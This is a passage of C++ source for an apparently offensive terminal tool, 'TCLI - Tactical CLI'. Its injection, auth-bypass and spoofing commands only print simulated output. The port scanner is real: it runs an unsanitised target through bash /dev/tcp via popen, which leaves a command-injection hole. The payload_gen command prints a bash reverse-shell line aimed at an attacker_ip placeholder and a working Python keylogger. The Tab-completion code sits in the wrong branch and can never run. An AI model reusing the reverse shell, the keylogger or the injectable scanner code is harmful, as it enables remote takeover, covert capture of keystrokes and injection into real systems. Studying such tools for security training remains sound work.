			if (std::regex_search(buffer.begin() + pos, buffer.end(), m, url_regex) && m.position() == 0) {
				result += COLOR_UNDER + COLOR_CYAN + m.str(0) + COLOR_RESET;
				pos += m.length(0);
				continue;
			}
			if (std::regex_search(buffer.begin() + pos, buffer.end(), m, path_regex) && m.position() == 0) {
				result += COLOR_BOLD + COLOR_YELLOW + m.str(0) + COLOR_RESET;
				pos += m.length(0);
				continue;
			}
			if (std::regex_search(buffer.begin() + pos, buffer.end(), m, string_regex) && m.position() == 0) {
				result += COLOR_BG_BLU + COLOR_YELLOW + m.str(0) + COLOR_RESET;
				pos += m.length(0);
				continue;
			}
			if (std::regex_search(buffer.begin() + pos, buffer.end(), m, flag_regex) && m.position() == 0) {
				result += COLOR_BG_YEL + COLOR_BLUE + m.str(0) + COLOR_RESET;
				pos += m.length(0);
				continue;
			}
			if (std::regex_search(buffer.begin() + pos, buffer.end(), m, number_regex) && m.position() == 0) {
				result += COLOR_GREEN + m.str(0) + COLOR_RESET;
				pos += m.length(0);
				continue;
			}
			if (std::regex_search(buffer.begin() + pos, buffer.end(), m, hex_regex) && m.position() == 0) {
				result += COLOR_ORANGE + m.str(0) + COLOR_RESET;
				pos += m.length(0);
				continue;
			}
			if (std::regex_search(buffer.begin() + pos, buffer.end(), m, ip_regex) && m.position() == 0) {
				result += COLOR_BG_CYAN + COLOR_BOLD + COLOR_GRAY + m.str(0) + COLOR_RESET;
				pos += m.length(0);
				continue;
			}
			if (std::regex_search(buffer.begin() + pos, buffer.end(), m, email_regex) && m.position() == 0) {
				result += COLOR_PINK + m.str(0) + COLOR_RESET;
				pos += m.length(0);
				continue;
			}
			if (std::regex_search(buffer.begin() + pos, buffer.end(), m, assign_regex) && m.position() == 0) {
				result += COLOR_BOLD + COLOR_RED + m.str(0) + COLOR_RESET;
				pos += m.length(0);
				continue;
			}
			if (std::regex_search(buffer.begin() + pos, buffer.end(), m, word_regex) && m.position() == 0) {
				std::string word = m.str(0);
				if (commands.count(word)) {
					result += COLOR_BOLD + COLOR_PURPLE + word + COLOR_RESET;
				} else if (options.count(word)) {
					result += COLOR_BG_YEL + COLOR_BLUE + word + COLOR_RESET;
				} else if (keywords.count(word)) {
					if (word == "local")
						result += COLOR_BG_GRN + COLOR_GRAY + " LOCAL " + COLOR_RESET;
					else if (word == "global")
						result += COLOR_BG_CYAN + COLOR_GRAY + " GLOBAL " + COLOR_RESET;
					else if (word == "user")
						result += COLOR_BG_MAG + COLOR_GRAY + " USER " + COLOR_RESET;
					else if (word == "admin")
						result += COLOR_BG_RED + COLOR_BOLD + COLOR_GRAY + " ADMIN " + COLOR_RESET;
					else if (word == "path")
						result += COLOR_BOLD + COLOR_YELLOW + word + COLOR_RESET;
					else if (word == "url")
						result += COLOR_BOLD + COLOR_CYAN + word + COLOR_RESET;
					else if (word == "mac")
						result += COLOR_BOLD + COLOR_PINK + "mac" + COLOR_RESET;
					else if (word == "ip")
						result += COLOR_BOLD + COLOR_CYAN + "ip" + COLOR_RESET;
					else if (word == "dns")
						result += COLOR_BOLD + COLOR_BLUE + "dns" + COLOR_RESET;
					else if (word == "user-agent")
						result += COLOR_BOLD + COLOR_GREEN + "user-agent" + COLOR_RESET;
					else
						result += COLOR_BOLD + COLOR_PINK + word + COLOR_RESET;
				} else if (bool_literals.count(word)) {
					// Highlight true/false as bold green/red
					if (word == "true")
						result += COLOR_BOLD + COLOR_GREEN + word + COLOR_RESET;
					else
						result += COLOR_BOLD + COLOR_RED + word + COLOR_RESET;
				} else {
					result += word;
				}
				pos += m.length(0);
				continue;
			}
			result += buffer[pos];
			++pos;
		}
		return result;
	}

	// -------------------------------------------------------------------------
	// Enhanced ReadLine With Tab Completion
	// -------------------------------------------------------------------------
	std::string readLineWithArrows(std::vector<std::string>& history) {
		std::string buffer;
		size_t cursor = 0;
		int historyIndex = history.size();
		std::string currentBuffer;
		bool inHistory = false;
		bool promptPrinted = false;
		while (true) {
			int c = platform::getch();
			if (!promptPrinted && (isprint(c) || c == 27 || c == 127 || c == 8 || c == 9)) {
				std::cout << "\n";
				printPrompt();
				std::cout.flush();
				std::cout << "\033[s";
				promptPrinted = true;
			}
			if (c == 10 || c == 13) { // Enter
				if (!promptPrinted) {
					std::cout << "\n";
					printPrompt();
					std::cout.flush();
					std::cout << "\033[s";
					promptPrinted = true;
				}
				std::cout << "\033[u";
				std::cout << highlightInput(buffer);
				std::cout << "\033[K" << std::endl;
				break;
			} else if (c == 127 || c == 8) { // Backspace
				if (cursor > 0) {
					buffer.erase(buffer.begin() + cursor - 1);
					cursor--;
					std::cout << "\033[u";
					std::cout << highlightInput(buffer);
					std::cout << "\033[K";
					for (size_t i = 0; i < buffer.size() - cursor; ++i) std::cout << "\b";
					std::cout.flush();
				}
			} else if (c == 27) { // Escape sequence
				int c1 = platform::getch();
				if (c1 == 91) {
					int c2 = platform::getch();
					if (c2 == 68) { // Left arrow
						if (cursor > 0) {
							cursor--;
							std::cout << "\b";
						}
					} else if (c2 == 67) { // Right arrow
						if (cursor < buffer.size()) {
							std::cout << buffer[cursor];
							cursor++;
						}
					} else if (c2 == 65) { // Up arrow
						if (historyIndex > 0) {
							if (!inHistory) {
								currentBuffer = buffer;
								inHistory = true;
							}
							historyIndex--;
							buffer = history[historyIndex];
							cursor = buffer.size();
							std::cout << "\033[u";
							std::cout << highlightInput(buffer);
							std::cout << "\033[K";
							std::cout.flush();
						}
					} else if (c2 == 66) { // Down arrow
						if (inHistory && historyIndex < (int)history.size() - 1) {
							historyIndex++;
							buffer = history[historyIndex];
							cursor = buffer.size();
							std::cout << "\033[u";
							std::cout << highlightInput(buffer);
							std::cout << "\033[K";
							std::cout.flush();
						} else if (inHistory && historyIndex == (int)history.size() - 1) {
							historyIndex++;
							buffer = currentBuffer;
							cursor = buffer.size();
							std::cout << "\033[u";
							std::cout << highlightInput(buffer);
							std::cout << "\033[K";
							std::cout.flush();
							inHistory = false;
						}
					}
				}
				else if (c == 9) { // Tab
					std::string prefix = buffer.substr(0, cursor);
					std::vector<std::string> completions = getCompletions(prefix);
					if (completions.empty()) {
						// No completions, beep
						std::cout << "\a";
						std::cout.flush();
					} else if (completions.size() == 1) {
						// Single completion: complete it
						std::string comp = completions[0];
						// Find the last token in prefix
						size_t lastSpace = prefix.find_last_of(" ");
						std::string before = (lastSpace == std::string::npos) ? "" : prefix.substr(0, lastSpace + 1);
						std::string token = (lastSpace == std::string::npos) ? prefix : prefix.substr(lastSpace + 1);
						std::string toInsert = comp.substr(token.size());
						buffer.insert(cursor, toInsert);
						cursor += toInsert.size();
						std::cout << "\033[u";
						std::cout << highlightInput(buffer);
						std::cout << "\033[K";
						for (size_t i = 0; i < buffer.size() - cursor; ++i) std::cout << "\b";
						std::cout.flush();
					} else {
						// Multiple completions: find common prefix
						size_t lastSpace = prefix.find_last_of(" ");
						std::string token = (lastSpace == std::string::npos) ? prefix : prefix.substr(lastSpace + 1);
						std::string common = completions[0];
						for (const auto& s : completions) {
							size_t j = token.size();
							while (j < common.size() && j < s.size() && common[j] == s[j]) ++j;
							common = common.substr(0, j);
						}
						if (common.size() > token.size()) {
							std::string toInsert = common.substr(token.size());
							buffer.insert(cursor, toInsert);
							cursor += toInsert.size();
							std::cout << "\033[u";
							std::cout << highlightInput(buffer);
							std::cout << "\033[K";
							for (size_t i = 0; i < buffer.size() - cursor; ++i) std::cout << "\b";
							std::cout.flush();
						} else {
							// Print completions and reprint prompt+buffer
							printCompletions(completions);
							std::cout << "\033[u";
							std::cout << highlightInput(buffer);
							std::cout << "\033[K";
							for (size_t i = 0; i < buffer.size() - cursor; ++i) std::cout << "\b";
							std::cout.flush();
						}
					}
				}
				} else if (isprint(c)) {
					buffer.insert(buffer.begin() + cursor, (char)c);
					cursor++;
					std::cout << "\033[u";
					std::cout << highlightInput(buffer);
					std::cout << "\033[K";
					for (size_t i = 0; i < buffer.size() - cursor; ++i) std::cout << "\b";
					std::cout.flush();
				}
			}
		return buffer;
	}

	void cmdScan(const std::string& args) {
		std::string target = args;
		if (target.empty()) {
			std::cerr << COLOR_RED << "[ FAIL ]" << COLOR_RESET << " Usage: scan [target]\n";
			return;
		}
		std::cout << COLOR_CYAN << "Scanning " << target << " for open ports/services...\n" << COLOR_RESET;

		if (fs::exists(target) && fs::is_directory(target)) {
			std::cout << COLOR_GREEN << "[ OK ]" << COLOR_RESET << " Local directory detected. Simulating service scan...\n";
			std::vector<std::string> services = {"ssh", "http", "ftp", "smb"};
			for (const auto& svc : services) {
				std::cout << "  - " << COLOR_BLUE << svc << COLOR_RESET << " : " << COLOR_GREEN << "running" << COLOR_RESET << "\n";
			}
			return;
		}

		std::vector<int> ports = {21, 22, 23, 25, 53, 80, 110, 143, 443, 3306, 8080};
		std::vector<std::string> portNames = {
			"FTP", "SSH", "Telnet", "SMTP", "DNS", "HTTP", "POP3", "IMAP", "HTTPS", "MySQL", "HTTP-alt"
		};
		std::vector<std::future<void>> futures;
		std::mutex outMutex;
		std::string timeout = config["scan_timeout"];
		for (size_t i = 0; i < ports.size(); ++i) {
			futures.push_back(std::async(std::launch::async, [&, i] {
				std::string cmd = "timeout " + timeout + " bash -c \"</dev/tcp/" + target + "/" + std::to_string(ports[i]) + "\" 2>/dev/null && echo open || echo closed";
				FILE* pipe = popen(cmd.c_str(), "r");
				if (!pipe) return;
				char buf[32];
				std::string res;
				while (fgets(buf, sizeof(buf), pipe)) res += buf;
				pclose(pipe);
				std::lock_guard<std::mutex> lock(outMutex);
				if (res.find("open") != std::string::npos)
					std::cout << "  - Port " << COLOR_YELLOW << ports[i] << COLOR_RESET << " (" << portNames[i] << "): " << COLOR_GREEN << "open" << COLOR_RESET << "\n";
			}));
		}
		for (auto& f : futures) f.wait();
		std::cout << COLOR_CYAN << "Scan complete.\n" << COLOR_RESET;
	}

	void cmdInject(const std::string& args) {
		std::istringstream iss(args);
		std::string target, payload, mode;
		iss >> target >> payload >> mode;
		if (target.empty() || payload.empty() || mode.empty()) {
			std::cerr << COLOR_RED << "[ FAIL ]" << COLOR_RESET << " Usage: inject [target] [payload] [--sql|--xss|--cmd]\n";
			return;
		}
		std::cout << COLOR_CYAN << "Simulating injection on " << target << " with payload: " << payload << "\n" << COLOR_RESET;
		if (mode == "--sql") {
			std::cout << COLOR_PURPLE << "[SQLi] Sending payload to " << target << "...\n" << COLOR_RESET;
			std::cout << COLOR_GREEN << "[ OK ]" << COLOR_RESET << " No SQL error detected (simulation).\n";
		} else if (mode == "--xss") {
			std::cout << COLOR_PURPLE << "[XSS] Injecting script into " << target << "...\n" << COLOR_RESET;
			std::cout << COLOR_GREEN << "[ OK ]" << COLOR_RESET << " No XSS reflected (simulation).\n";
		} else if (mode == "--cmd") {
			std::cout << COLOR_PURPLE << "[CMD] Attempting command injection on " << target << "...\n" << COLOR_RESET;
			std::cout << COLOR_GREEN << "[ OK ]" << COLOR_RESET << " No command executed (simulation).\n";
		} else {
			std::cerr << COLOR_RED << "[ FAIL ]" << COLOR_RESET << " Unknown mode. Use --sql, --xss, or --cmd\n";
		}
	}

	void cmdAuthBypass(const std::string& args) {
		std::string target = args;
		if (target.empty()) {
			std::cerr << COLOR_RED << "[ FAIL ]" << COLOR_RESET << " Usage: auth_bypass [target]\n";
			return;
		}
		std::cout << COLOR_CYAN << "Testing authentication bypass on " << target << "...\n" << COLOR_RESET;
		std::vector<std::pair<std::string, std::string>> creds = {
			{"admin", "admin"}, {"root", "root"}, {"user", "password"}, {"test", "test"}
		};
		for (const auto& cred : creds) {
			std::cout << "  - Trying " << cred.first << "/" << cred.second << "... ";
			std::cout << COLOR_RED << "fail" << COLOR_RESET << "\n";
		}
		std::cout << COLOR_GREEN << "[ OK ]" << COLOR_RESET << " No weak authentication found (simulation).\n";
	}

	void cmdSpoof(const std::string& args) {
		std::istringstream iss(args);
		std::string type, option;
		iss >> type >> option;
		if (type.empty()) {
			std::cerr << COLOR_RED << "[ FAIL ]" << COLOR_RESET << " Usage: spoof [mac|ip|dns|user-agent] [options]\n";
			return;
		}
		if (type == "mac") {
			if (option == "--randomize") {
				std::random_device rd;
				std::mt19937 gen(rd());
				std::uniform_int_distribution<> dis(0, 255);
				std::ostringstream mac;
				for (int i = 0; i < 6; ++i) {
					if (i) mac << ":";
					mac << std::hex << std::uppercase << (dis(gen) & 0xFF);
				}
				std::cout << COLOR_CYAN << "Randomized MAC: " << mac.str() << COLOR_RESET << "\n";
			} else {
				std::cout << COLOR_CYAN << "Spoofing MAC address (simulation)...\n" << COLOR_RESET;
			}
		} else if (type == "ip") {
			if (option == "--randomize") {
				std::random_device rd;
				std::mt19937 gen(rd());
				std::uniform_int_distribution<> dis(1, 254);
				std::ostringstream ip;
				ip << dis(gen) << "." << dis(gen) << "." << dis(gen) << "." << dis(gen);
				std::cout << COLOR_CYAN << "Randomized IP: " << ip.str() << COLOR_RESET << "\n";
			} else {
				std::cout << COLOR_CYAN << "Spoofing IP address (simulation)...\n" << COLOR_RESET;
			}
		} else if (type == "dns") {
			std::cout << COLOR_CYAN << "Spoofing DNS (simulation)...\n" << COLOR_RESET;
		} else if (type == "user-agent") {
			std::vector<std::string> agents = {
				"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
				"curl/7.68.0",
				"Wget/1.20.3 (linux-gnu)",
				"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
			};
			std::string ua = agents[std::rand() % agents.size()];
			std::cout << COLOR_CYAN << "Spoofed User-Agent: " << ua << COLOR_RESET << "\n";
		} else {
			std::cerr << COLOR_RED << "[ FAIL ]" << COLOR_RESET << " Unknown spoof type. Use mac, ip, dns, or user-agent\n";
		}
	}

	void cmdSession(const std::string& args) {
		std::istringstream iss(args);
		std::string subcmd;
		iss >> subcmd;
		if (subcmd == "list") {
			std::cout << COLOR_BOLD << COLOR_CYAN << "Active Sessions:\n" << COLOR_RESET;
			if (sessions.empty()) {
				std::cout << COLOR_GRAY << "  (No active sessions)\n" << COLOR_RESET;
				return;
			}
			for (const auto& s : sessions) {
				std::cout << "  [" << COLOR_YELLOW << s.id << COLOR_RESET << "] "
					<< COLOR_PURPLE << s.type << COLOR_RESET << " - "
					<< (s.active ? COLOR_GREEN + std::string("active") : COLOR_GRAY + std::string("inactive")) << COLOR_RESET
					<< " (" << s.info << ")\n";
			}
		} else if (subcmd == "kill") {
			int id;
			iss >> id;
			if (!id) {
				std::cerr << COLOR_RED << "[ FAIL ]" << COLOR_RESET << " Usage: session kill <id>\n";
				return;
			}
			auto it = std::find_if(sessions.begin(), sessions.end(), [id](const Session& s){ return s.id == id; });
			if (it != sessions.end() && it->active) {
				it->active = false;
				std::cout << COLOR_GREEN << "[ OK ]" << COLOR_RESET << " Session " << id << " terminated.\n";
			} else {
				std::cerr << COLOR_RED << "[ FAIL ]" << COLOR_RESET << " No active session with ID " << id << ".\n";
			}
		} else if (subcmd == "resume") {
			int id;
			iss >> id;
			if (!id) {
				std::cerr << COLOR_RED << "[ FAIL ]" << COLOR_RESET << " Usage: session resume <id>\n";
				return;
			}
			auto it = std::find_if(sessions.begin(), sessions.end(), [id](const Session& s){ return s.id == id; });
			if (it != sessions.end() && !it->active) {
				it->active = true;
				std::cout << COLOR_GREEN << "[ OK ]" << COLOR_RESET << " Session " << id << " resumed.\n";
			} else {
				std::cerr << COLOR_RED << "[ FAIL ]" << COLOR_RESET << " No inactive session with ID " << id << ".\n";
			}
		} else {
			std::cerr << COLOR_GRAY << "Usage:\n"
				<< "  session list\n"
				<< "  session kill <id>\n"
				<< "  session resume <id>\n" << COLOR_RESET;
		}
	}

	void cmdHistory(const std::string& args) {
		std::string subcmd = args;
		std::transform(subcmd.begin(), subcmd.end(), subcmd.begin(), ::tolower);
		if (subcmd.empty()) {
			std::cout << COLOR_BOLD << COLOR_CYAN << "Command History:\n" << COLOR_RESET;
			if (globalHistory.empty()) {
				std::cout << COLOR_GRAY << "  (No history)\n" << COLOR_RESET;
				return;
			}
			int idx = 1;
			for (const auto& h : globalHistory) {
				std::cout << "  " << COLOR_YELLOW << idx++ << COLOR_RESET << ": " << h << "\n";
			}
		} else if (subcmd == "clear") {
			std::cout << COLOR_YELLOW << "Are you sure you want to clear all history? (y/n): " << COLOR_RESET;
			std::string answer;
			std::getline(std::cin, answer);
			std::transform(answer.begin(), answer.end(), answer.begin(), ::tolower);
			if (answer == "y" || answer == "yes") {
				globalHistory.clear();
				std::cout << COLOR_GREEN << "[ OK ]" << COLOR_RESET << " History cleared.\n";
			} else {
				std::cout << COLOR_GRAY << "History not cleared.\n" << COLOR_RESET;
			}
		} else {
			std::cerr << COLOR_GRAY << "Usage: history [clear]" << COLOR_RESET << "\n";
		}
	}

	void cmdPayloadGen(const std::string& args) {
		std::string type = args;
		std::transform(type.begin(), type.end(), type.begin(), ::tolower);
		if (type == "reverse_shell") {
			std::cout << COLOR_BOLD << COLOR_CYAN << "Reverse Shell Payload (bash):\n" << COLOR_RESET;
			std::cout << COLOR_YELLOW << "bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1" << COLOR_RESET << "\n";
		} else if (type == "keylogger") {
			std::cout << COLOR_BOLD << COLOR_CYAN << "Keylogger Payload (Python):\n" << COLOR_RESET;
			std::cout << COLOR_YELLOW << "import pynput.keyboard\n"
				"def on_press(key):\n"
				"    with open('keys.txt','a') as f:\n"
				"        f.write(str(key)+'\\n')\n"
				"from pynput import keyboard\n"
				"with keyboard.Listener(on_press=on_press) as l: l.join()" << COLOR_RESET << "\n";
		} else {
			std::cerr << COLOR_GRAY << "Supported types: reverse_shell, keylogger\nUsage: payload_gen <type>" << COLOR_RESET << "\n";
		}
	}

	void cmdConfig(const std::string& args) {
		std::istringstream iss(args);
		std::string subcmd;
		iss >> subcmd;
		if (subcmd == "show") {
			std::cout << COLOR_BOLD << COLOR_CYAN << "Current Configuration:\n" << COLOR_RESET;
			for (const auto& kv : config) {
				std::cout << "  " << kv.first << ":   " << COLOR_YELLOW << kv.second << COLOR_RESET << "\n";
			}
		} else if (subcmd == "set") {
			std::string key, value;
			iss >> key >> value;
			if (key.empty() || value.empty()) {
				std::cerr << COLOR_GRAY << "Usage: config set <key> <value>" << COLOR_RESET << "\n";
				return;
			}
			std::transform(key.begin(), key.end(), key.begin(), ::tolower);
			if (config.count(key) == 0) {
				std::cerr << COLOR_GRAY << "Unknown config key: " << key << COLOR_RESET << "\n";
				return;
			}
			std::cout << COLOR_YELLOW << "Are you sure you want to change '" << key << "' to '" << value << "'? (y/n): " << COLOR_RESET;
			std::string answer;
			std::getline(std::cin, answer);
			std::transform(answer.begin(), answer.end(), answer.begin(), ::tolower);
			if (!(answer == "y" || answer == "yes")) {
				std::cout << COLOR_GRAY << "Config not changed.\n" << COLOR_RESET;
				return;
			}
			config[key] = value;
			saveConfig("TCLI");
			std::cout << COLOR_GREEN << "[ OK ]" << COLOR_RESET << " Config updated.\n";
		} else {
			std::cerr << COLOR_GRAY << "Usage:\n"
				<< "  config show\n"
				<< "  config set <key> <value>\n" << COLOR_RESET;
		}
	}

	// -------------------------------------------------------------------------
	// New: Set Command for Realtime/Temporary or Persistent Config Change
	// -------------------------------------------------------------------------
	void cmdSet(const std::string& args) {
		std::istringstream iss(args);
		std::string key, value, persist;
		iss >> key >> std::ws;
		if (iss.peek() == '"' || iss.peek() == '\'') {
			char quote = iss.get();
			std::getline(iss, value, quote);
			iss >> persist;
		} else {
			iss >> value >> persist;
		}
		if (key.empty() || value.empty() || persist.empty()) {
			std::cerr << COLOR_GRAY << "Usage: set <key> <value> <true|false>\n"
				<< "Example: set user \"init\" true\n" << COLOR_RESET;
			return;
		}
		std::transform(key.begin(), key.end(), key.begin(), ::tolower);
		std::transform(persist.begin(), persist.end(), persist.begin(), ::tolower);
		if (config.count(key) == 0) {
			std::cerr << COLOR_GRAY << "Unknown config key: " << key << COLOR_RESET << "\n";
			return;
		}
		config[key] = value;
		if (persist == "true" || persist == "1" || persist == "yes") {
			saveConfig("TCLI");
			std::cout << COLOR_GREEN << "[ OK ]" << COLOR_RESET << " '" << key << "' set to '" << value << "' (persisted).\n";
		} else {
			std::cout << COLOR_GREEN << "[ OK ]" << COLOR_RESET << " '" << key << "' set to '" << value << "' (temporary).\n";
		}
	}

	// -------------------------------------------------------------------------
	// Main CLI Loop
	// -------------------------------------------------------------------------

	void cliLoop() {
		helloBanner();
		loadConfig("TCLI");
		loadingBar("Loading TCLI");
		std::vector<std::string> history;
		while (!shouldClose) {
			std::string line = readLineWithArrows(history);
			if (line.empty()) continue;
			history.push_back(line);
			globalHistory.push_back(line);
			size_t space = line.find(' ');
			std::string cmd = (space == std::string::npos) ? line : line.substr(0, space);
			std::string args = (space == std::string::npos) ? "" : line.substr(space + 1);
			if (cmd == "quit" || cmd == "exit") cmdQuit(args);
			else if (cmd == "clr" || cmd == "clear") cmdClear(args);
			else if (cmd == "rl" || cmd == "reload") cmdReload(args);
			else if (cmd == "tcli" && args == "setup") cmdSetup(args);
			else if (cmd == "connect") cmdConnect(args);
			else if (cmd == "ld") {
				if (args == "local") cmdListLocal(args);
				else if (args == "global") cmdListGlobal(args);
				else std::cerr << COLOR_GRAY << "Usage: ld local|global" << COLOR_RESET << "\n";
			} else if (cmd == "help" || cmd == "--help" || cmd == "-h") {
				cmdHelp(args);
			} else if (cmd == "enum") {
				cmdEnum(args);
			} else if (cmd == "break") {
				cmdBreak(args);
			} else if (cmd == "scan") {
				cmdScan(args);
			} else if (cmd == "inject") {
				cmdInject(args);
			} else if (cmd == "auth_bypass") {
				cmdAuthBypass(args);
			} else if (cmd == "spoof") {
				cmdSpoof(args);
			} else if (cmd == "session") {
				cmdSession(args);
			} else if (cmd == "history") {
				cmdHistory(args);
			} else if (cmd == "payload_gen") {
				cmdPayloadGen(args);
			} else if (cmd == "config") {
				cmdConfig(args);
			} else if (cmd == "set") {
				cmdSet(args);
			} else {
				std::cerr << COLOR_GRAY << "Unknown command: " << cmd << "\nType `help` for a list of available commands." << COLOR_RESET << "\n";
			}
		}
	}
}

// -----------------------------------------------------------------------------
// Main Entry Point
// -----------------------------------------------------------------------------

int main() {
	platform::setTerminalTitle("TCLI - Tactical CLI");
	CLI::cliLoop();
	return 0;
}
